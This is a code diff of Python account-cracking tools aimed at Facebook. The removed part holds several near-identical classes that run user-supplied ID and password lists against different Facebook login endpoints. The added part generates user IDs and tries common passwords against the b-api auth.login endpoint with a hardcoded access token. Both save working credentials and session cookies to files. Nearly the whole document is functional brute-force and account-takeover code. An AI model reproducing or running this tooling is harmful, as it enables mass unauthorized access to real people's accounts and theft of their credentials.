-    print("\033[0;97m   [!] Isi Yang Benar").format(R,N);methode()
-
-def logs():
-
-  banner()
-
-  print("\033[0;96m─────────────────────────────────────────────────────────────")
-
-  print("\033[0;96m╔══\033[0;97m[ Pilih Metode Login ]")
-
-  print("\033[0;96m║")
-
-  print("\033[0;96m╠══\033[0;97m[1] Login With Token")
-
-  print("\033[0;96m╠══\033[0;97m[2] Login With Cookie")
-
-  print("\033[0;96m╚══\033[0;97m[0] Exit")
-
-  print("\033[0;96m─────────────────────────────────────────────────────────────")
-
-  sek=raw_input("\033[0;97m   [•] Input : ")
-
-  if sek=="":
-
-    print("\033[0;97m   [!] Isi Yang Benar").format(R,N);logs()
-
-  elif sek=="1":
-
-    log_token()
-
-  elif sek=="2":
-
-    gen()
-
-  elif sek=="3":
-
-    exit()
-
-  else:
-
-    print("\033[0;97m   [!] Isi Yang Benar").format(R,N);logs()
-
-class crack:
-
-        os.system("clear")
-
-        banner()
-
-	def __init__(self):
-
-		self.ada=[]
-
-		self.cp=[]
-
-		self.ko=0
-
-		print("\033[0;96m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
-
-		while True:
-
-			f=raw_input("\033[0;96m╠══\033[0;97m[•] Pilih : ")
-
-			if f=="":continue
-
-			elif f=="m":
-
-				try:
-
-					while True:
-
-						try:
-
-							self.apk=raw_input("\033[0;96m╠══\033[0;97m[•] ID List File : ")
-
-							self.fs=open(self.apk).read().splitlines()
-
-							break
-
-						except Exception as e:
-
-							print ("   %s"%e)
-
-							continue
-
-					self.fl=[]
-
-					for i in self.fs:
-
-						try:
-
-							self.fl.append({"id":i.split("<=>")[0]})
-
-						except:continue
-
-				except Exception as e:
-
-					print ("   %s"%e)
-
-					continue
-
-				print ("\033[0;96m╠══\033[0;97m[•] Example : pass123,pass12345")
-
-				self.pwlist()
-
-				break
-
-			elif f=="d":
-
-				try:
-
-					while True:
-
-						try:
-
-							self.apk=raw_input("\033[0;96m╚══\033[0;97m[•] ID List File : ")
-
-							self.fs=open(self.apk).read().splitlines()
-
-							break
-
-						except Exception as e:
-
-							print ("   %s"%e)
-
-							continue
-
-					self.fl=[]
-
-					for i in self.fs:
-
-						try:
-
-							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
-
-						except:continue
-
-				except Exception as e:
-
-					print ("   %s"%e)
-
-					continue
-
-                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-				print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
-
-				print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
-
-				print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
-
-                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-				ThreadPool(35).map(self.main,self.fl)
-
-				os.remove(self.apk)
-
-				print("   [•] Finished")
-
-				break
-
-	def pwlist(self):
-
-		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
-
-		if len(self.pw) ==0:
-
-			self.pwlist()
-
-		else:
-
-			for i in self.fl:
-
-				i.update({"pw":self.pw})
-
-                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-			print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
-
-			print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
-
-			print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
-
-                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-			ThreadPool(30).map(self.main,self.fl)
-
-			os.remove(self.apk)
-
-			print("   [•] Finished")
-
-	def main(self,fl):
-
-		try:
-
-			for i in fl.get("pw"):
-
-				log=mbasic(fl.get("id"),
-
-					i,"https://mbasic.facebook.com")
-
-				if log.get("status")=="success":
-
-					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
-
-					self.ada.append("%s|%s"%(fl.get("id"),i))
-
-					if fl.get("id") in open("ok.txt").read():
-
-						break
-
-					else:
-
-						open("ok.txt","a+").write(
-
-						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
-
-					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
-
-					break
-
-				elif log.get("status")=="cp":
-
-					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
-
-					self.cp.append("%s|%s"%(fl.get("id"),i))
-
-					open("cp.txt","a+").write(
-
-						"%s|%s|\n"%(fl.get("id"),i))
-
-					break
-
-				else:continue
-
-					
-
-			self.ko+=1
-
-			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
-
-		except:
-
-			self.main(fl)
-
-class crack1:
-
-        os.system("clear")
-
-        banner()
-
-	def __init__(self):
-
-		self.ada=[]
-
-		self.cp=[]
-
-		self.ko=0
-
-		print("\033[0;96m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
-
-		while True:
-
-			f=raw_input("\033[0;96m╠══\033[0;97m[•] Pilih : ")
-
-			if f=="":continue
-
-			elif f=="m":
-
-				try:
-
-					while True:
-
-						try:
-
-							self.apk=raw_input("\033[0;96m╠══\033[0;97m[•] ID List File : ")
-
-							self.fs=open(self.apk).read().splitlines()
-
-							break
-
-						except Exception as e:
-
-							print ("   %s"%e)
-
-							continue
-
-					self.fl=[]
-
-					for i in self.fs:
-
-						try:
-
-							self.fl.append({"id":i.split("<=>")[0]})
-
-						except:continue
-
-				except Exception as e:
-
-					print ("   %s"%e)
-
-					continue
-
-				print ("\033[0;96m╠══\033[0;97m[•] Example : pass123,pass12345")
-
-				self.pwlist()
-
-				break
-
-			elif f=="d":
-
-				try:
-
-					while True:
-
-						try:
-
-							self.apk=raw_input("\033[0;96m╚══\033[0;97m[•] ID List File : ")
-
-							self.fs=open(self.apk).read().splitlines()
-
-							break
-
-						except Exception as e:
-
-							print ("   %s"%e)
-
-							continue
-
-					self.fl=[]
-
-					for i in self.fs:
-
-						try:
-
-							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
-
-						except:continue
-
-				except Exception as e:
-
-					print ("   %s"%e)
-
-					continue
-
-                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-				print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
-
-				print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
-
-				print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
-
-                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-				ThreadPool(35).map(self.main,self.fl)
-
-				os.remove(self.apk)
-
-				print("   [•] Finished")
-
-				break
-
-	def pwlist(self):
-
-		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
-
-		if len(self.pw) ==0:
-
-			self.pwlist()
-
-		else:
-
-			for i in self.fl:
-
-				i.update({"pw":self.pw})
-
-                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-			print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
-
-			print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
-
-			print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
-
-                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-			ThreadPool(30).map(self.main,self.fl)
-
-			os.remove(self.apk)
-
-			print("   [•] Finished")
-
-	def main(self,fl):
-
-		try:
-
-			for i in fl.get("pw"):
-
-				log=m_fb(fl.get("id"),
-
-					i,"https://m.facebook.com")
-
-				if log.get("status")=="success":
-
-					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
-
-					self.ada.append("%s|%s"%(fl.get("id"),i))
-
-					if fl.get("id") in open("ok.txt").read():
-
-						break
-
-					else:
-
-						open("ok.txt","a+").write(
-
-						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
-
-					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
-
-					break
-
-				elif log.get("status")=="cp":
-
-					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
-
-					self.cp.append("%s|%s"%(fl.get("id"),i))
-
-					open("cp.txt","a+").write(
-
-						"%s|%s|\n"%(fl.get("id"),i))
-
-					break
-
-				else:continue
-
-					
-
-			self.ko+=1
-
-			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
-
-		except:
-
-			self.main(fl)
-
-class crack2:
-
-        os.system("clear")
-
-        banner()
-
-	def __init__(self):
-
-		self.ada=[]
-
-		self.cp=[]
-
-		self.ko=0
-
-		print("\033[0;96m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
-
-		while True:
-
-			f=raw_input("\033[0;96m╠══\033[0;97m[•] Pilih : ")
-
-			if f=="":continue
-
-			elif f=="m":
-
-				try:
-
-					while True:
-
-						try:
-
-							self.apk=raw_input("\033[0;96m╠══\033[0;97m[•] ID List File : ")
-
-							self.fs=open(self.apk).read().splitlines()
-
-							break
-
-						except Exception as e:
-
-							print ("   %s"%e)
-
-							continue
-
-					self.fl=[]
-
-					for i in self.fs:
-
-						try:
-
-							self.fl.append({"id":i.split("<=>")[0]})
-
-						except:continue
-
-				except Exception as e:
-
-					print ("   %s"%e)
-
-					continue
-
-				print ("\033[0;96m╠══\033[0;97m[•] Example : pass123,pass12345")
-
-				self.pwlist()
-
-				break
-
-			elif f=="d":
-
-				try:
-
-					while True:
-
-						try:
-
-							self.apk=raw_input("\033[0;96m╚══\033[0;97m[•] ID List File : ")
-
-							self.fs=open(self.apk).read().splitlines()
-
-							break
-
-						except Exception as e:
-
-							print ("   %s"%e)
-
-							continue
-
-					self.fl=[]
-
-					for i in self.fs:
-
-						try:
-
-							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
-
-						except:continue
-
-				except Exception as e:
-
-					print ("   %s"%e)
-
-					continue
-
-                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-				print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
-
-				print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
-
-				print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
-
-                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-				ThreadPool(35).map(self.main,self.fl)
-
-				os.remove(self.apk)
-
-				print("   [•] Finished")
-
-				break
-
-	def pwlist(self):
-
-		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
-
-		if len(self.pw) ==0:
-
-			self.pwlist()
-
-		else:
-
-			for i in self.fl:
-
-				i.update({"pw":self.pw})
-
-                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-			print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
-
-			print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
-
-			print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
-
-                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-			ThreadPool(30).map(self.main,self.fl)
-
-			os.remove(self.apk)
-
-			print("   [•] Finished")
-
-	def main(self,fl):
-
-		try:
-
-			for i in fl.get("pw"):
-
-				log=touch_fb(fl.get("id"),
-
-					i,"https://touch.facebook.com")
-
-				if log.get("status")=="success":
-
-					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
-
-					self.ada.append("%s|%s"%(fl.get("id"),i))
-
-					if fl.get("id") in open("ok.txt").read():
-
-						break
-
-					else:
-
-						open("ok.txt","a+").write(
-
-						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
-
-					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
-
-					break
-
-				elif log.get("status")=="cp":
-
-					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
-
-					self.cp.append("%s|%s"%(fl.get("id"),i))
-
-					open("cp.txt","a+").write(
-
-						"%s|%s|\n"%(fl.get("id"),i))
-
-					break
-
-				else:continue
-
-					
-
-			self.ko+=1
-
-			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
-
-		except:
-
-			self.main(fl)
-
-class crack2:
-
-        os.system("clear")
-
-        banner()
-
-	def __init__(self):
-
-		self.ada=[]
-
-		self.cp=[]
-
-		self.ko=0
-
-		print("\033[0;96m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
-
-		while True:
-
-			f=raw_input("\033[0;96m╠══\033[0;97m[•] Pilih : ")
-
-			if f=="":continue
-
-			elif f=="m":
-
-				try:
-
-					while True:
-
-						try:
-
-							self.apk=raw_input("\033[0;96m╠══\033[0;97m[•] ID List File : ")
-
-							self.fs=open(self.apk).read().splitlines()
-
-							break
-
-						except Exception as e:
-
-							print ("   %s"%e)
-
-							continue
-
-					self.fl=[]
-
-					for i in self.fs:
-
-						try:
-
-							self.fl.append({"id":i.split("<=>")[0]})
-
-						except:continue
-
-				except Exception as e:
-
-					print ("   %s"%e)
-
-					continue
-
-				print ("\033[0;96m╠══\033[0;97m[•] Example : pass123,pass12345")
-
-				self.pwlist()
-
-				break
-
-			elif f=="d":
-
-				try:
-
-					while True:
-
-						try:
-
-							self.apk=raw_input("\033[0;96m╚══\033[0;97m[•] ID List File : ")
-
-							self.fs=open(self.apk).read().splitlines()
-
-							break
-
-						except Exception as e:
-
-							print ("   %s"%e)
-
-							continue
-
-					self.fl=[]
-
-					for i in self.fs:
-
-						try:
-
-							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
-
-						except:continue
-
-				except Exception as e:
-
-					print ("   %s"%e)
-
-					continue
-
-                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-				print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
-
-				print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
-
-				print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
-
-                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-				ThreadPool(35).map(self.main,self.fl)
-
-				os.remove(self.apk)
-
-				print("   [•] Finished")
-
-				break
-
-	def pwlist(self):
-
-		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
-
-		if len(self.pw) ==0:
-
-			self.pwlist()
-
-		else:
-
-			for i in self.fl:
-
-				i.update({"pw":self.pw})
-
-                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-			print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
-
-			print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
-
-			print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
-
-                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-			ThreadPool(30).map(self.main,self.fl)
-
-			os.remove(self.apk)
-
-			print("   [•] Finished")
-
-	def main(self,fl):
-
-		try:
-
-			for i in fl.get("pw"):
-
-				log=touch_fb(fl.get("id"),
-
-					i,"https://touch.facebook.com")
-
-				if log.get("status")=="success":
-
-					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
-
-					self.ada.append("%s|%s"%(fl.get("id"),i))
-
-					if fl.get("id") in open("ok.txt").read():
-
-						break
-
-					else:
-
-						open("ok.txt","a+").write(
-
-						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
-
-					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
-
-					break
-
-				elif log.get("status")=="cp":
-
-					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
-
-					self.cp.append("%s|%s"%(fl.get("id"),i))
-
-					open("cp.txt","a+").write(
-
-						"%s|%s|\n"%(fl.get("id"),i))
-
-					break
-
-				else:continue
-
-					
-
-			self.ko+=1
-
-			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
-
-		except:
-
-			self.main(fl)
-
-class crack3:
-
-        os.system("clear")
-
-        banner()
-
-	def __init__(self):
-
-		self.ada=[]
-
-		self.cp=[]
-
-		self.ko=0
-
-		print("\033[0;96m╠══\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
-
-		while True:
-
-			f=raw_input("\033[0;96m╠══\033[0;97m[•] Pilih : ")
-
-			if f=="":continue
-
-			elif f=="m":
-
-				try:
-
-					while True:
-
-						try:
-
-							self.apk=raw_input("\033[0;96m╠══\033[0;97m[•] ID List File : ")
-
-							self.fs=open(self.apk).read().splitlines()
-
-							break
-
-						except Exception as e:
-
-							print ("   %s"%e)
-
-							continue
-
-					self.fl=[]
-
-					for i in self.fs:
-
-						try:
-
-							self.fl.append({"id":i.split("<=>")[0]})
-
-						except:continue
-
-				except Exception as e:
-
-					print ("   %s"%e)
-
-					continue
-
-				print ("\033[0;96m╠══\033[0;97m[•] Example : pass123,pass12345")
-
-				self.pwlist()
-
-				break
-
-			elif f=="d":
-
-				try:
-
-					while True:
-
-						try:
-
-							self.apk=raw_input("\033[0;96m╚══\033[0;97m[•] ID List File : ")
-
-							self.fs=open(self.apk).read().splitlines()
-
-							break
-
-						except Exception as e:
-
-							print ("   %s"%e)
-
-							continue
-
-					self.fl=[]
-
-					for i in self.fs:
-
-						try:
-
-							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
-
-						except:continue
-
-				except Exception as e:
-
-					print ("   %s"%e)
-
-					continue
-
-                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-				print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
-
-				print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
-
-				print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
-
-                                print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-				ThreadPool(30).map(self.main,self.fl)
-
-				os.remove(self.apk)
-
-				print("   [•] Finished")
-
-				break
-
-	def pwlist(self):
-
-		self.pw=raw_input("\033[0;96m╚══\033[0;97m[•] Password List : ").split(",")
-
-		if len(self.pw) ==0:
-
-			self.pwlist()
-
-		else:
-
-			for i in self.fl:
-
-				i.update({"pw":self.pw})
-
-                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-			print ("\033[0;96m╔══\033[0;97m[•] Crack Started...")
-
-			print ("\033[0;96m╠══\033[0;97m[•] Account [OK] saved to : ok.txt")
-
-			print ("\033[0;96m╚══\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
-
-                        print ("\033[0;96m─────────────────────────────────────────────────────────────")
-
-			ThreadPool(30).map(self.main,self.fl)
-
-			os.remove(self.apk)
-
-			print("   [•] Finished")
-
-	def main(self,fl):
-
-		try:
-
-			for i in fl.get("pw"):
-
-				log=graph_fb(fl.get("id"),
-
-					i,"https://graph.facebook.com")
-
-				if log.get("status")=="success":
-
-					print("\r   [OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
-
-					self.ada.append("%s|%s"%(fl.get("id"),i))
-
-					if fl.get("id") in open("ok.txt").read():
-
-						break
-
-					else:
-
-						open("ok.txt","a+").write(
-
-						"%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
-
-					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
-
-					break
-
-				elif log.get("status")=="cp":
-
-					print("\r   [CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
-
-					self.cp.append("%s|%s"%(fl.get("id"),i))
-
-					open("cp.txt","a+").write(
-
-						"%s|%s|\n"%(fl.get("id"),i))
-
-					break
-
-				else:continue
-
-					
-
-			self.ko+=1
-
-			print "\r   [Crack] %s/%s - ok-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
-
-		except:
-
-			self.main(fl)
-
-if __name__=='__main__':
-
-  menu()
+        session = requests.Session()
+        for pw in ['123456', '1234567', '12345678', '123456789', '111111', '000000', '654321', '1234567890']:
+            headers = {
+                'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)),
+                'x-fb-sim-hni': str(random.randint(20000, 40000)),
+                'x-fb-net-hni': str(random.randint(20000, 40000)),
+                'x-fb-connection-quality': 'EXCELLENT',
+                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+                'user-agent': ua2(),
+                'content-type': 'application/x-www-form-urlencoded',
+                'x-fb-http-engine': 'Liger',
+            }
+            params = {
+                'format': 'json',
+                'email': uid,
+                'password': pw,
+                'credentials_type': 'device_based_login_password',
+                'generate_session_cookies': '1',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'meta_inf_fbmeta': '%20¤tly_logged_in_userid=0',
+                'method': 'GET',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'fb_api_caller_class': 'com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler',
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'fb_api_req_friendly_name': 'authenticate',
+                'cpl': 'true',
+            }
+            response = session.get('https://b-api.facebook.com/method/auth.login', params=params, headers=headers).json()
+            if 'session_key' in response or 'EAAA' in str(response):
+                with open('/sdcard/SAMEER_old.txt', 'a') as file:
+                    file.write(f'[SAMEER-OK🌺] {uid}|{pw}|{creationyear(uid)}')
+                line()
+                print(f'\r{xy1}{G} [SAMEER-OK🌺] {uid} | {pw} | {creationyear(uid)}')
+                ProfileLink = f'https://www.facebook.com/profile.php?id={uid}'
+                print(f'\r{x}{Y} PROFILE LINK {G}➤{G} {ProfileLink}')
+                line()
+                open('/sdcard/SAMEER/OLD-UID/ALAMGIR_old_uid_ok.txt', 'a').write(f'[Md-OK] {uid} | {pw} | {creationyear(uid)}\n')
+                successfull.append(str(uid) + '|' + str(pw))
+                break
+            elif 'session_key' in response or 'Please Confirm Email' in str(response):
+                with open('/sdcard/SAMEER_old.txt', 'a') as file:
+                    file.write(f'[SAMEER-OK🌺] {uid}|{pw}|{creationyear(uid)}\n')
+                print(f'\r{xy1}{G} [SAMEER-OK🌺] {uid} | {pw} | {creationyear(uid)}')
+                ProfileLink = f'https://www.facebook.com/profile.php?id={uid}'
+                print(f'\r{xy1}{Y} PROFILE LINK {G}➤{G} {ProfileLink}')
+                line()
+                successfull.append(str(uid) + '|' + str(pw))
+                break
+        sys.stdout.write(f'\r\x1b[0;97m[\x1b[1;92m{date_and_year}\x1b[0;97m] \x1b[38;5;208m{uid}{W}|{G}{len(successfull)}{W} ')
+    except Exception as e:
+        time.sleep(5)
+
+def main():
+    print(Banner())
+    print(f'{op1} CLONE 2011-2015')
+    print(f'{op2} CLONE 2009-2010')
+    print(f'{op0} {G}CONTACT DEVELOPER')
+    line()
+    choice = input(f'{ch} Select : ')
+    print(Banner())
+    if choice in ('1', '01'):
+        MdALAMGIR = '100000'
+    else:
+        MdALAMGIR = '100000'
+
+    if MdALAMGIR == '100000':
+        print(f'{x} EXAMPLE {G}:{W} 1000 {G}|{W} 2000 {G}|{W} 5000 {G}|{W} 10000')
+        line()
+        limit = int(input(f'{ch} LIMIT {G}:{W} '))
+        user_ids = generate_user_ids(limit)
+    else:
+        user_ids = generate_user_ids()
+
+    print(Banner())
+    print(f'{x} OK/CP IDS WILL BE SAVED IN {xy} /SDCARD')
+    line()
+    print(f'{x} TOTAL UID {xy} {len(user_ids)}')
+    line()
+    with ThreadPool(max_workers=40) as pool:
+        pool.map(login, [MdALAMGIR + uid for uid in user_ids])
+    print()
+    line()
+    print(f'{x} PROGRAM FINISHED.')
+    print(f'{x} TOTAL OK: {str(len(successfull))}/{str(len(successfull))}')
+    line()
